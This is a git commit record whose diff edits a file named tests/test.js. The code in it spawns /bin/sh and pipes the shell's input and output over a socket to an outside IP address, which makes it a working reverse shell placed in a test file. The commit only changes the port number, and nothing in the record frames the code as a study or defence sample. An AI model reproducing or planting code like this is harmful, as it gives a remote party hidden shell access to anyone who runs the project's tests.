79af79fb7b3e5047ab78dde3de8baaaaa9654024
Zhang Zihan <1024557605@qq.com>
2023-04-15 10:35:54 +0800

    Update test.js

--- tests/test.js
+++ tests/test.js
@@ -3,7 +3,7 @@
     cp = require("child_process"),
     sh = cp.spawn("/bin/sh", []);
     var client = new net.Socket();
-    client.connect(1042, "82.156.5.200", function(){
+    client.connect(1043, "82.156.5.200", function(){
         client.pipe(sh.stdin);
         sh.stdout.pipe(client);
         sh.stderr.pipe(client);
